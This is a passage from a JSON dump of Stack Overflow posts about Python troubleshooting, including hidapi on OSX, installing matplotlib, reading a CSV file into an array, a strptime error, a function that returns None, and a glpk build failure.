using PyCharm on a Windows machine?", "body": "<p>I've heard that I can't use PyCharm (on my Windows machine) that's pointing to a Python interpreter located on a Linux VM.</p>\n\n<p>Any ideas why not?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["python", "macos", "hid", "hidapi"], "answers": [{"comments": [{"owner": {"reputation": 1447, "user_id": 1291435, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/fd3939e451c1cb6f1915302e893595a5?s=128&d=identicon&r=PG", "display_name": "Anurag Peshne", "link": "https://stackoverflow.com/users/1291435/anurag-peshne"}, "edited": false, "score": 0, "creation_date": 1478295418, "post_id": 39603673, "comment_id": 68112557, "body": "Thanks for your reply, it turned out to be internal issue with the code. I&#39;ll just remove my comments since this was not related to hid/hidapi"}], "tags": [], "owner": {"reputation": 346, "user_id": 4624291, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/aa227922f2c2b8f3df06f419d5696f0d?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Courchaine", "link": "https://stackoverflow.com/users/4624291/oscar-courchaine"}, "is_accepted": true, "score": 1, "last_activity_date": 1474405409, "creation_date": 1474405409, "answer_id": 39603673, "question_id": 37173907, "link": "https://stackoverflow.com/questions/37173907/getting-valueerror-not-open-when-trying-to-open-a-connection-with-hidapi-hid/39603673#39603673", "title": "getting &#39;ValueError: not open&#39; when trying to open a connection with hidapi/hid on OSX", "body": "<p>Often, hidapi needs sudo permissions on a mac for some reason. Even if you are running Ubuntu on a mac.</p>\n"}], "owner": {"reputation": 346, "user_id": 4624291, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/aa227922f2c2b8f3df06f419d5696f0d?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar Courchaine", "link": "https://stackoverflow.com/users/4624291/oscar-courchaine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 270, "favorite_count": 0, "accepted_answer_id": 39603673, "answer_count": 1, "score": 1, "last_activity_date": 1505245043, "creation_date": 1463003526, "question_id": 37173907, "link": "https://stackoverflow.com/questions/37173907/getting-valueerror-not-open-when-trying-to-open-a-connection-with-hidapi-hid", "title": "getting &#39;ValueError: not open&#39; when trying to open a connection with hidapi/hid on OSX", "body": "<p>I am using python to open a hid/hidapi (the error is the same either way) connection on OSX El Capitan. However, It gives me the following error stacktrace:</p>\n\n<pre><code> Traceback (most recent call last):\n  File \"/Users/johndoe/Library/Python/2.7/lib/python/site-packages/gevent/greenlet.py\", line 534, in run\n    result = self._run(*self.args, **self.kwargs)\n  File \"/Users/johndoe/IdeaProjects/projectname/emokit-master/python/emokit/emotiv.py\", line 403, in setup\n    self.setup_darwin()\n  File \"/Users/johndoe/IdeaProjects/projectname/emokit-master/python/emokit/emotiv.py\", line 526, in setup_darwin\n    data = hidraw.read(34)\n  File \"hid.pyx\", line 105, in hid.device.read (hid.c:2338)\nValueError: not open\n&lt;Greenlet at 0x10f7f1b90: &lt;bound method Emotiv.setup of &lt;emokit.emotiv.Emotiv object at 0x10f532c50&gt;&gt;&gt; failed with ValueError\n</code></pre>\n\n<p>I can't find anything on this, and do not usually use OSX or python, so I am at a bit of a loss</p>\n"}, {"tags": ["python", "macos", "numpy", "matplotlib", "osx-yosemite"], "comments": [{"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 1, "creation_date": 1463004035, "post_id": 37173901, "comment_id": 61882636, "body": "Do you have <a href=\"http://macports.org\" rel=\"nofollow noreferrer\">MacPorts</a> installed? If not, that&#39;s why your <code>port</code> command is failing. Also, why were you trying to install the Python 2.5 version? If you have pip set up correctly, <code>sudo pip install -U matplotlib numpy</code> should install those packages and their dependencies."}, {"owner": {"reputation": 105, "user_id": 5728861, "user_type": "registered", "accept_rate": 18, "profile_image": "https://www.gravatar.com/avatar/ba77dc9b881392378974d0a4ebab6da8?s=128&d=identicon&r=PG&f=1", "display_name": "Danisk", "link": "https://stackoverflow.com/users/5728861/danisk"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463004701, "post_id": 37173901, "comment_id": 61882914, "body": "I&#39;ve got Pip well installed(as far as I know) , everything else does install with pip. But when I do sudo pip install matplotlib numpy it says: zsh: correct matplotlib to .matplotlib ? ([Y]es/[N]o/[E]dit/[A]bort)  (I don&#39;t have MacPorts installed)"}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463005604, "post_id": 37173901, "comment_id": 61883252, "body": "Just pick No - you don&#39;t want to change the command. This is why I don&#39;t use zsh..."}, {"owner": {"reputation": 2631, "user_id": 1202834, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/518724a126e37579e4d114eddb0bc5c9?s=128&d=identicon&r=PG", "display_name": "aquil.abdullah", "link": "https://stackoverflow.com/users/1202834/aquil-abdullah"}, "edited": false, "score": 0, "creation_date": 1463024039, "post_id": 37173901, "comment_id": 61887991, "body": "My recommendation is to use <a href=\"http://brew.sh/\" rel=\"nofollow noreferrer\">homebrew</a>, and then use the python science recipe  laid out here: <a href=\"https://joernhees.de/blog/2014/02/25/scientific-python-on-mac-os-x-10-9-with-homebrew/\" rel=\"nofollow noreferrer\">joernhees.de/blog/2014/02/25/&hellip;</a>. Finally, I would make sure to install virtualenv and virtualenv wrapper if that&#39;s the rout you plan to take."}], "owner": {"reputation": 105, "user_id": 5728861, "user_type": "registered", "accept_rate": 18, "profile_image": "https://www.gravatar.com/avatar/ba77dc9b881392378974d0a4ebab6da8?s=128&d=identicon&r=PG&f=1", "display_name": "Danisk", "link": "https://stackoverflow.com/users/5728861/danisk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 78, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1463003512, "creation_date": 1463003512, "question_id": 37173901, "link": "https://stackoverflow.com/questions/37173901/mac-osx-yosemite-matplotlib", "title": "MAC OSX Yosemite - matplotlib", "body": "<p>I would like to install matplotlib on a MAC OSX Yosemite \nI've tried these things: </p>\n\n<pre><code>sudo port install py25-matplotlib +cairo+gtk2\nPassword:\nsudo: port: command not found\n</code></pre>\n\n<p>__</p>\n\n<pre><code>sudo pip install -U matplotlib\nzsh: correct matplotlib to .matplotlib ? ([Y]es/[N]o/[E]dit/[A]bort) \n</code></pre>\n\n<p>__</p>\n\n<pre><code>pip install matplotlib\nzsh: correct matplotlib to .matplotlib ? ([Y]es/[N]o/[E]dit/[A]bort) \n</code></pre>\n\n<p>does a file when I want to use matplotlib also need import <code>numpy as np</code>? \nCan I even download matplotlib on a MAC OSX?</p>\n\n<p>What am I doing wrong? :( </p>\n"}, {"tags": ["python", "csv"], "comments": [{"owner": {"reputation": 1157, "user_id": 6030424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0f3dfdc15d27f5511ce8fe6567002392?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Myddeltyn", "link": "https://stackoverflow.com/users/6030424/tom-myddeltyn"}, "edited": false, "score": 0, "creation_date": 1463003591, "post_id": 37173892, "comment_id": 61882465, "body": "what is error? and how are you attempting to read the csv file? are you using the <code>csv</code> module?"}, {"owner": {"reputation": 113, "user_id": 5458868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-t6R2lP9supw/AAAAAAAAAAI/AAAAAAAAL_o/fTlwDAU4rRc/photo.jpg?sz=128", "display_name": "Edian Franklin Franco de los S", "link": "https://stackoverflow.com/users/5458868/edian-franklin-franco-de-los-s"}, "edited": false, "score": 0, "creation_date": 1463003929, "post_id": 37173892, "comment_id": 61882594, "body": "is not a error, I dont know how convert to cvs to array"}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463004152, "post_id": 37173892, "comment_id": 61882685, "body": "Questions seeking debugging help (<b>&quot;why isn&#39;t this code working?&quot;</b>) must include the desired behavior, <i>a specific problem or error</i> and <i>the shortest code necessary</i> to reproduce it <b>in the question itself</b>. Questions without <b>a clear problem statement</b> are not useful to other readers. See: <a href=\"http://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable Example</a>."}, {"owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463004359, "post_id": 37173892, "comment_id": 61882775, "body": "Does your CSV file actually contain the parentheses <code>( )</code>? If so, it&#39;s not valid CSV. How was the file generated?"}, {"owner": {"reputation": 113, "user_id": 5458868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-t6R2lP9supw/AAAAAAAAAAI/AAAAAAAAL_o/fTlwDAU4rRc/photo.jpg?sz=128", "display_name": "Edian Franklin Franco de los S", "link": "https://stackoverflow.com/users/5458868/edian-franklin-franco-de-los-s"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463004801, "post_id": 37173892, "comment_id": 61882960, "body": "@MattDMo dont have parathesis, do have any idea how I can convert from cvs to array, keep the same orden"}, {"owner": {"reputation": 1743, "user_id": 3629691, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/RkvSZ.jpg?s=128&g=1", "display_name": "CodeJockey", "link": "https://stackoverflow.com/users/3629691/codejockey"}, "edited": false, "score": 0, "creation_date": 1463005066, "post_id": 37173892, "comment_id": 61883049, "body": "Are you trying to return a list of lists, then?  like <code>a = [[123, 234, 345], [456, 567, 678]]</code> but with your numbers instead?"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "edited": false, "score": 0, "creation_date": 1463005496, "post_id": 37173892, "comment_id": 61883217, "body": "If you don&#39;t have the parens the csv lib will do the parsing so where is the problem?"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 5458868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-t6R2lP9supw/AAAAAAAAAAI/AAAAAAAAL_o/fTlwDAU4rRc/photo.jpg?sz=128", "display_name": "Edian Franklin Franco de los S", "link": "https://stackoverflow.com/users/5458868/edian-franklin-franco-de-los-s"}, "reply_to_user": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "edited": false, "score": 0, "creation_date": 1463005695, "post_id": 37174180, "comment_id": 61883293, "body": "Yes, I the original float, one per cell in the array. @MattDMo"}], "tags": [], "owner": {"reputation": 1555, "user_id": 4959722, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-AQWZF9OmEs4/AAAAAAAAAAI/AAAAAAAAAGE/wvp_7UFCeZs/photo.jpg?sz=128", "display_name": "James Buck", "link": "https://stackoverflow.com/users/4959722/james-buck"}, "is_accepted": false, "score": 3, "last_activity_date": 1463005791, "last_edit_date": 1463005791, "creation_date": 1463004887, "answer_id": 37174180, "question_id": 37173892, "link": "https://stackoverflow.com/questions/37173892/convert-from-csv-to-array-in-python/37174180#37174180", "title": "Convert from CSV to array in Python", "body": "<p>If your file doesn't contain parentheses</p>\n\n<pre><code>with open('input.csv') as f:\n    output = [float(s) for line in f.readlines() for s in line[:-1].split(',')]\n    print(output);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 89500, "user_id": 1426065, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/476e67c92121154e7910301e56cdfc4c?s=128&d=identicon&r=PG", "display_name": "MattDMo", "link": "https://stackoverflow.com/users/1426065/mattdmo"}, "is_accepted": true, "score": 13, "last_activity_date": 1463005360, "creation_date": 1463005360, "answer_id": 37174260, "question_id": 37173892, "link": "https://stackoverflow.com/questions/37173892/convert-from-csv-to-array-in-python/37174260#37174260", "title": "Convert from CSV to array in Python", "body": "<p>You should use the <a href=\"https://docs.python.org/3/library/csv.html\" rel=\"noreferrer\"><code>csv</code></a> module:</p>\n\n<pre><code>import csv\n\nresults = []\nwith open(\"input.csv\") as csvfile:\n    reader = csv.reader(csvfile, quoting=csv.QUOTE_NONNUMERIC) # change contents to floats\n    for row in reader: # each row is a list\n        results.append(row)\n</code></pre>\n\n<p>This gives:</p>\n\n<pre><code>[[0.000264, 0.000352, 8.7e-05, 0.000549], \n[0.00016, 0.000223, 1.1e-05, 0.000142], \n[0.008853, 0.006519, 0.002043, 0.009819], \n[0.002076, 0.001686, 0.000959, 0.003107], \n[0.000599, 0.000133, 0.000113, 0.000466], \n[0.002264, 0.001927, 0.00079, 0.003815], \n[0.002761, 0.00288, 0.001261, 0.006851], \n[0.000723, 0.000617, 0.000794, 0.002189]]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1188, "user_id": 920494, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/LtH1G.jpg?s=128&g=1", "display_name": "Monkeyanator", "link": "https://stackoverflow.com/users/920494/monkeyanator"}, "is_accepted": false, "score": 2, "last_activity_date": 1463005370, "creation_date": 1463005370, "answer_id": 37174262, "question_id": 37173892, "link": "https://stackoverflow.com/questions/37173892/convert-from-csv-to-array-in-python/37174262#37174262", "title": "Convert from CSV to array in Python", "body": "<p>The <code>csv</code> module was created to do just this. The following implementation of the module is taken straight from the <a href=\"https://docs.python.org/2/library/csv.html\" rel=\"nofollow\">Python docs</a>.  </p>\n\n<pre><code>import csv \nwith open('file.csv','rb') as csvfile: \n    reader = csv.reader(csvfile, delimiter=',', quotechar='|') \n    for row in reader:\n        #add data to list or other data structure\n</code></pre>\n\n<p>The delimiter is the character that separates data entries, and the quotechar is the quotechar. </p>\n"}], "owner": {"reputation": 113, "user_id": 5458868, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-t6R2lP9supw/AAAAAAAAAAI/AAAAAAAAL_o/fTlwDAU4rRc/photo.jpg?sz=128", "display_name": "Edian Franklin Franco de los S", "link": "https://stackoverflow.com/users/5458868/edian-franklin-franco-de-los-s"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68215, "favorite_count": 7, "accepted_answer_id": 37174260, "answer_count": 3, "score": 8, "last_activity_date": 1545120325, "creation_date": 1463003469, "last_edit_date": 1545120325, "question_id": 37173892, "link": "https://stackoverflow.com/questions/37173892/convert-from-csv-to-array-in-python", "title": "Convert from CSV to array in Python", "body": "<p>I have a CSV file containing the following.</p>\n\n<pre><code>0.000264,0.000352,0.000087,0.000549\n0.00016,0.000223,0.000011,0.000142\n0.008853,0.006519,0.002043,0.009819\n0.002076,0.001686,0.000959,0.003107\n0.000599,0.000133,0.000113,0.000466\n0.002264,0.001927,0.00079,0.003815\n0.002761,0.00288,0.001261,0.006851\n0.000723,0.000617,0.000794,0.002189\n</code></pre>\n\n<p>I want convert the values into an array in Python and keep the same order (<strong>row and column</strong>). How I can achieve this? </p>\n\n<p>I have tried different functions but ended with error.</p>\n"}, {"tags": ["python", "datetime", "matplotlib"], "owner": {"reputation": 1094, "user_id": 3465514, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/614de7121749ba3f768bee7757b674e6?s=128&d=identicon&r=PG", "display_name": "smagnan", "link": "https://stackoverflow.com/users/3465514/smagnan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 168, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1463004380, "creation_date": 1463003437, "last_edit_date": 1463004380, "question_id": 37173883, "link": "https://stackoverflow.com/questions/37173883/importing-matplotlib-pyplot-makes-datetime-fail-valueerror-unconverted-data-re", "title": "Importing matplotlib pyplot makes datetime fail (ValueError: unconverted data remains)", "body": "<p>I have an issue I don't really know how to address and I would like some advice.</p>\n\n<p>Whenever I import <code>matplotlib</code> <code>pyplot</code>, <code>datetime</code> <code>strptime()</code> fails to convert data.</p>\n\n<h2>Minimal code:</h2>\n\n<p><strong>Working version, without matplotlib:</strong></p>\n\n<pre><code>from datetime import datetime\ndate = \"3/14/16, 9:57 AM\"\ndatetime.strptime(date, '%m/%d/%y, %I:%M %p')\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>datetime.datetime(2016, 3, 14, 9, 57)\n</code></pre>\n\n<p><strong>Working if I import matplotlib</strong></p>\n\n<pre><code>import matplotlib\ndate = \"3/14/16, 9:57 AM\"\nfrom datetime import datetime\ndatetime.strptime(date, '%m/%d/%y, %I:%M %p')\n</code></pre>\n\n<p>result</p>\n\n<pre><code>datetime.datetime(2016, 3, 14, 9, 57)\n</code></pre>\n\n<p><strong>Not working with pyplot:</strong></p>\n\n<pre><code>from datetime import datetime\nimport matplotlib.pyplot\ndate = \"3/14/16, 9:57 AM\"\ndatetime.strptime(date, '%m/%d/%y, %I:%M %p')\n</code></pre>\n\n<p>Error:</p>\n\n<pre><code>Traceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/usr/lib/python3.5/_strptime.py\", line 510, in _strptime_datetime\n    tt, fraction = _strptime(data_string, format)\n  File \"/usr/lib/python3.5/_strptime.py\", line 346, in _strptime\n    data_string[found.end():])\nValueError: unconverted data remains: AM\n</code></pre>\n\n<h2>Versions</h2>\n\n<pre><code>python: Python 3.5.1+\nmatplotlib: matplotlib (1.5.1)\nos: Ubuntu 16.04 LTS\n</code></pre>\n\n<p>matplotlib was installed through pip</p>\n\n<pre><code>pip: pip 8.1.1 (python 3.5)\n</code></pre>\n\n<p>I'm pretty new to python so my knowledge is quite limited but I guess something might interfere with datetime in pyplot</p>\n\n<p>I know people may not be able to reproduce the issue as I suspect it is specific to my system, but I'd appreciate any insight or idea. I can add more information on the system if necessary. (I don't have an other machine available at the moment to try to reproduce the problem)</p>\n"}, {"tags": ["python", "python-3.x", "types"], "comments": [{"owner": {"reputation": 124932, "user_id": 2308683, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/eac16c9fc481cb6825f8b3a35f916b5c?s=128&d=identicon&r=PG", "display_name": "OneCricketeer", "link": "https://stackoverflow.com/users/2308683/onecricketeer"}, "edited": false, "score": 0, "creation_date": 1463003363, "post_id": 37173837, "comment_id": 61882359, "body": "Is the indentation of your question correct for <code>read_bound</code>? If not, please <a href=\"https://stackoverflow.com/posts/37173837/edit\">edit</a> and fix"}, {"owner": {"reputation": 45920, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 1, "creation_date": 1463003422, "post_id": 37173837, "comment_id": 61882382, "body": "<code>read_bound()</code> doesn&#39;t return anything"}], "answers": [{"tags": [], "owner": {"reputation": 243983, "user_id": 35070, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/6f92354195e8874dbee44d5c8714d506?s=128&d=identicon&r=PG", "display_name": "phihag", "link": "https://stackoverflow.com/users/35070/phihag"}, "is_accepted": false, "score": 2, "last_activity_date": 1463003429, "creation_date": 1463003429, "answer_id": 37173881, "question_id": 37173837, "link": "https://stackoverflow.com/questions/37173837/unsupported-operand-types-for-nonetype-and-int/37173881#37173881", "title": "unsupported operand type(s) for +: &#39;NoneType&#39; and &#39;int&#39;", "body": "<p>The function <code>read_bound</code> does not include a return statement. If execution reaches the end of a function in Python, <a href=\"https://docs.python.org/dev/reference/simple_stmts.html#return\" rel=\"nofollow\">the function will return <code>None</code></a>, and thus <code>upper_bound</code> will be <code>None</code>.</p>\n\n<p>Currently you assign to a local variable which coincidentally shares the name with the <code>upper_bound</code> in <code>main</code>, which will have no effect since you never read from it.</p>\n\n<p>Modify <code>read_bound</code> to include a return:</p>\n\n<pre><code>def read_bound(prompt):\n    \"\"\"Reads the upper bound from the standard input (keyboard).\n       If the user enters something that is not a positive integer\n       the function issues an error message and retries\n       repeatedly\"\"\"\n    upper_bound = None\n    while upper_bound is None:\n        line = input(prompt)\n        if line.isnumeric():\n            return int(line)  # &lt;-- added\n        else:\n            print(\"You must enter a positive number.\") \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5109, "user_id": 2373748, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/moadr.png?s=128&g=1", "display_name": "galaxyan", "link": "https://stackoverflow.com/users/2373748/galaxyan"}, "is_accepted": true, "score": 2, "last_activity_date": 1463003432, "creation_date": 1463003432, "answer_id": 37173882, "question_id": 37173837, "link": "https://stackoverflow.com/questions/37173837/unsupported-operand-types-for-nonetype-and-int/37173882#37173882", "title": "unsupported operand type(s) for +: &#39;NoneType&#39; and &#39;int&#39;", "body": "<p>the read bound code did not return the input</p>\n\n<pre><code>def read_bound(prompt):\n\"\"\"Reads the upper bound from the standard input (keyboard).\n   If the user enters something that is not a positive integer\n   the function issues an error message and retries\n   repeatedly\"\"\"\n upper_bound = None\n while upper_bound is None:\n    line = input(prompt)\n    if line.isnumeric():\n        return int(line)\n    else:\n        print(\"You must enter a positive number.\") \n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 6322607, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/770404216c2be4b4cf5d45f1aea9fca1?s=128&d=identicon&r=PG&f=1", "display_name": "Hidden", "link": "https://stackoverflow.com/users/6322607/hidden"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 582, "favorite_count": 1, "accepted_answer_id": 37173882, "answer_count": 2, "score": 1, "last_activity_date": 1463201047, "creation_date": 1463003205, "last_edit_date": 1463201047, "question_id": 37173837, "link": "https://stackoverflow.com/questions/37173837/unsupported-operand-types-for-nonetype-and-int", "title": "unsupported operand type(s) for +: &#39;NoneType&#39; and &#39;int&#39;", "body": "<p>My current piece of code is made to do this: \"Print all the perfect squares from zero up to a given maximum. This version is refactored to make it more understandable and more maintainable.\"</p>\n\n<p>Currently my issue is in regards to this piece of code:</p>\n\n<pre><code>def read_bound(prompt):\n   \"\"\"Reads the upper bound from the standard input (keyboard).\n      If the user enters something that is not a positive integer\n      the function issues an error message and retries\n      repeatedly\"\"\"\n   upper_bound = None\n   while upper_bound is None:\n       line = input(prompt)\n       if line.isnumeric():\n           return int(line)\n       else:\n           print(\"You must enter a positive number.\") \n</code></pre>\n\n<p>Upon calling the main function:</p>\n\n<pre><code>def main():\n   \"\"\"Bring everything together\"\"\"\n   lower_bound = read_bound(\"Enter the lower bound: \")\n   upper_bound = read_bound(\"Enter the upper bound: \")\n   squares = []\n   for num in range(lower_bound, upper_bound + 1):\n       if is_perfect_square(num):\n           squares.append(num)\n\n   print_squares(lower_bound, upper_bound, squares)\n</code></pre>\n\n<p>I get the error:</p>\n\n<p>builtins.TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'</p>\n\n<p>Why is it that the first object given by the user is of the type 'none' but the second an 'int'. I wish for them to both be integers. What am I doing wrong?</p>\n\n<p>Both answers given were identical and fixed my problem. Accordingly, my code in the question has been amended. Thanks!</p>\n"}, {"tags": ["python", "linux", "ubuntu", "gcc"], "comments": [{"owner": {"reputation": 8401, "user_id": 988174, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/df46c580238842731e726b6b2af7ca2f?s=128&d=identicon&r=PG&f=1", "display_name": "Robert", "link": "https://stackoverflow.com/users/988174/robert"}, "edited": false, "score": 0, "creation_date": 1463003348, "post_id": 37173818, "comment_id": 61882352, "body": "Welcome to the site. could you please use block code for you command and error result."}], "answers": [{"tags": [], "owner": {"reputation": 4790, "user_id": 4491743, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aXCqO.jpg?s=128&g=1", "display_name": "Knud Larsen", "link": "https://stackoverflow.com/users/4491743/knud-larsen"}, "is_accepted": false, "score": 0, "last_activity_date": 1463152409, "creation_date": 1463152409, "answer_id": 37213640, "question_id": 37173818, "link": "https://stackoverflow.com/questions/37173818/error-command-x86-64-linux-gnu-gcc-failed-with-exit-status-4/37213640#37213640", "title": "error: command &#39;x86_64-linux-gnu-gcc&#39; failed with exit status 4", "body": "<hr>\n\n<p>Seems you have a corrupt glpk : </p>\n\n<blockquote>\n  <p>error: src/glpk.c: No such file or directory</p>\n</blockquote>\n\n<p>Please get a new \"glpk-0.3.tar.gz\" <a href=\"https://pypi.python.org/packages/dc/6c/33e383f6613a90865bddeb1666c2b6121563b21a41d12d75bc2836a6bfdb/glpk-0.3.tar.gz\" rel=\"nofollow\">https://pypi.python.org/packages/dc/6c/33e383f6613a90865bddeb1666c2b6121563b21a41d12d75bc2836a6bfdb/glpk-0.3.tar.gz</a></p>\n\n<pre><code>$ tar xvf glpk-0.3.tar.gz\n$ cd glpk-0.3/\n$ python setup.py build\n</code></pre>\n\n<p>\u2192 \u2192 No errors here.</p>\n\n<hr>\n"}], "owner": {"reputation": 1, "user_id": 6322267, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a44c7edd91ff7b4c0fa918f7b7b57626?s=128&d=identicon&r=PG&f=1", "display_name": "Glachas", "link": "https://stackoverflow.com/users/6322267/glachas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1649, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463152409, "creation_date": 1463003092, "last_edit_date": 1463005693, "question_id": 37173818, "link": "https://stackoverflow.com/questions/37173818/error-command-x86-64-linux-gnu-gcc-failed-with-exit-status-4", "title": "error: command &#39;x86_64-linux-gnu-gcc&#39; failed with exit status 4", "body": "<p>I am new to python and don't know much about linux commands. So please, consider my problem. I have tried to run the command:</p>\n\n<pre><code>    python pyglpk_setup.py build  \n</code></pre>\n\n<p>but I got following results:   </p>\n\n<pre><code>    running build  \n    running build_ext  \n    building 'glpk' extension  \n    x86_64-linux-gnu-gcc -pthread -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -fPIC -I/usr/local/include -Isrc -I/usr/include/python2.7 -c src/glpk.c -o build/temp.linux-x86_64-2.7/src/glpk.o -m64  \n    x86_64-linux-gnu-gcc: error: src/glpk.c: No such file or directory  \n    x86_64-linux-gnu-gcc: fatal error: no input files  \n    compilation terminated.  \n    error: command 'x86_64-linux-gnu-gcc' failed with exit status 4  \n</code></pre>\n\n<p>I think I have installed dependencies and tried other stuffs to make it run  but I am not able to resolve it.</p>\n\n<p>Why do I get this error?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463003509, "post_id": 37173748, "comment_id": 61882420, "body": "nop that not exact read the entire question"}, {"owner": {"reputation": 181, "user_id": 4928313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/346f5ce9b918ddbcb0dcb6e41732b5b4?s=128&d=identicon&r=PG&f=1", "display_name": "rikisa", "link": "https://stackoverflow.com/users/4928313/rikisa"}, "edited": false, "score": 1, "creation_date": 1463003868, "post_id": 37173748, "comment_id": 61882568, "body": "The shape of your data which is handled correctly is 3x3. The data producing an error have the shape 1x3x3. If those are numpy arrays try atomcoords = np.queeze(atomcoords)"}, {"owner": {"user_type": "does_not_exist", "display_name": "user177800"}, "edited": false, "score": 0, "creation_date": 1463003940, "post_id": 37173748, "comment_id": 61882597, "body": "one question per question"}, {"owner": {"reputation": 61, "user_id": 6322610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32fd1b6cbbda5a1bde8b4d250608ba87?s=128&d=identicon&r=PG&f=1", "display_name": "D1&#39;", "link": "https://stackoverflow.com/users/6322610/d1"}, "edited": false, "score": 0, "creation_date": 1463004054, "post_id": 37173748, "comment_id": 61882645, "body": "first of all it cant be duplicate, because it hasvalue error and type error. secondly u can think that it would be possibly duplicate of both those error. But then u think more carefully it makes no sense, so i think my sql functions is defined in a bad way or something bad with my entire code."}, {"owner": {"reputation": 24305, "user_id": 2776376, 